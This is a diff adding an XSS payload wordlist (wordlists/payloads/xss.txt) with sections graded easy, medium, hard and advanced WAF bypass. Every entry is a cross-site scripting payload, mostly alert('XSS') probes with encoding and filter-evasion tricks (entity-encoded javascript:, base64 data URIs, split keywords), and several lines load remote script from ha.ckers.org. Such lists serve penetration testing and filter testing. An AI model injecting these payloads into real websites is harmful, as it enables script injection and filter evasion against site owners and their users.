@@ -1,0 +1,98 @@
+# wordlists/payloads/xss.txt
+# ==================================================
+# XSS PAYLOADS - NIVEL EASY
+# ==================================================
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+javascript:alert('XSS')
+<body onload=alert('XSS')>
+<iframe src="javascript:alert('XSS')">
+<input onfocus=alert('XSS') autofocus>
+<details ontoggle=alert('XSS')>
+<select onfocus=alert('XSS')>
+<video><source onerror=alert('XSS')>
+<audio src=x onerror=alert('XSS')>
+<form><button formaction=javascript:alert('XSS')>X</button>
+<math><mi//xlink:href="data:x,<script>alert('XSS')</script>">
+<marquee onstart=alert('XSS')>
+<div onpointerenter=alert('XSS')>XSS</div>
+"><script>alert('XSS')</script>
+'><script>alert('XSS')</script>
+"><img src=x onerror=alert('XSS')>
+javascript:alert('XSS');
+data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=
+javascripT:alert('XSS')
+java%0ascript:alert('XSS')
+&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x22;&#x58;&#x53;&#x53;&#x22;&#x29;
+
+# ==================================================
+# XSS PAYLOADS - NIVEL MEDIUM
+# ==================================================
+<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG SRC=# onmouseover="alert('xxs')">
+<IMG SRC= onmouseover="alert('xxs')">
+<IMG onmouseover="alert('xxs')">
+<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+"><<SCRIPT>alert("XSS");//<</SCRIPT>
+<SCRIPT SRC=//ha.ckers.org/.j>
+<IMG SRC="javascript:alert('XSS')"
+<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
+";alert('XSS');//
+';alert('XSS');//
+</script><script>alert('XSS');</script>
+';!-"/*\<x/*\x00`\x0a\x0d>|\\{^(*/alert('XSS')%0D%0A
+<SCRIPT>String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41)</SCRIPT>
+<A HREF="javascript:document.location='http://www.example.com/'">XSS</A>
+<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBpZD0ic3ZnMyI+PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD48L3N2Zz4="></EMBED>
+
+# ==================================================
+# XSS PAYLOADS - NIVEL HARD
+# ==================================================
+<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT ="blah" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a="blah" ' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAME></FRAMESET>
+<TABLE BACKGROUND="javascript:alert('XSS')"></TABLE>
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV STYLE="width: expression(alert('XSS'));">
+<BASE HREF="javascript:alert('XSS');//">
+<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
+<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBpZD0ic3ZnMyI+PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD48L3N2Zz4="></EMBED>
+
+# ==================================================
+# XSS PAYLOADS - NIVEL ADVANCED (BYPASS WAF)
+# ==================================================
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=javascript:alert("XSS")>
+<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMG SRC="jav ascript:alert('XSS');">
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<IMG SRC=" &#14; javascript:alert('XSS');">
+<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<BODY ONLOAD=alert('XSS')>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>
+<SCRIPT SRC=//ha.ckers.org/.j>
+<IMG SRC="javascript:alert('XSS')"
+<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT ="blah" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a="blah" ' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
